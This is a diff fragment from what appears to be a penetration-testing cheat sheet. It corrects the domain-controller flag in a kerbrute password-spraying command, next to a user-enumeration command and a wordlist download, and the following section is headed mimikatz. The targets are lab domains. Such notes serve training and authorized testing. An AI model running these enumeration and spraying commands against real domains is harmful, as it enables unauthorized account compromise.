@@ -481,7 +481,7 @@ wget https://raw.githubusercontent.com/insidetrust/statistically-likely-username
 
 kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /usr/share/seclists/Usernames/Names/names.txt
 
-kerbrute passwordspray ./userlist Password123! -dc 10.10.10.248 -d active.htb 
+kerbrute passwordspray ./userlist Password123! --dc 10.10.10.248 -d active.htb 
 ```
 ### mimikatz
 ```powershell
